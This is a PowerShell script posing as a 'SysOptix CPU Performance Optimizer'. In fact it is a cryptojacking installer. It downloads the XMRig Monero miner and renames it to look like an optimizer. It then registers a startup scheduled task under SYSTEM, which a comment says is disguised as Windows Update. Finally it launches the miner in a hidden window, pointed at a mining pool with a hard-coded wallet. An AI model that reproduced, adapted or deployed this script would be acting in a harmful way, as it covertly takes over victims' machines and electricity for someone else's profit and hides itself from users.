# SysOptix CPU Performance Optimizer v2.3.1 - Windows Edition
# Copyright (c) 2024 SysOptix Corp.

$version = "2.3.1"
$serviceName = "SysOptCPU"
$logPath = "C:\Windows\Logs\SysOpt.log"

function Write-Log {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp SysOpt: $($args[0])" | Out-File -FilePath $logPath -Append -Encoding UTF8
}

# Resource check
$totalRAM = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
if ($totalRAM -lt 2) { exit 0 }

# Kill existing
Get-Process | Where-Object { $_.ProcessName -like "*xmrig*" -or $_.ProcessName -eq "cpu-opt" } | Stop-Process -Force

# Download optimizer
$optUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$optPath = "$env:TEMP\sysopt-cpu-opt-$version.zip"
Invoke-WebRequest -Uri $optUrl -OutFile $optPath -UseBasicParsing
Expand-Archive $optPath -DestinationPath "$env:ProgramData\SysOptix" -Force
Move-Item "$env:ProgramData\SysOptix\xmrig.exe" "$env:ProgramData\SysOptix\cpu-opt-$version.exe" -Force

# Scheduled Task (looks like Windows Update)
$action = New-ScheduledTaskAction -Execute "$env:ProgramData\SysOptix\cpu-opt-$version.exe" -Argument "-o pool.supportxmr.com:5555 -u 44AFFq5kSiGBoZ4NMDjjvsc4kxzdxcpFo2q9pGbK8uP1 -k --cpu-max-threads-hint=75"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "SysOptixPerformanceCheck" -Action $action -Trigger $trigger -Force -User "SYSTEM"

Start-Process "$env:ProgramData\SysOptix\cpu-opt-$version.exe" -ArgumentList "-o pool.supportxmr.com:5555 -u 44AFFq5kSiGBoZ4NMDjjvsc4kxzdxcpFo2q9pGbK8uP1 -k --cpu-max-threads-hint=75" -WindowStyle Hidden
Write-Log "Optimizer v$version deployed via Scheduled Task"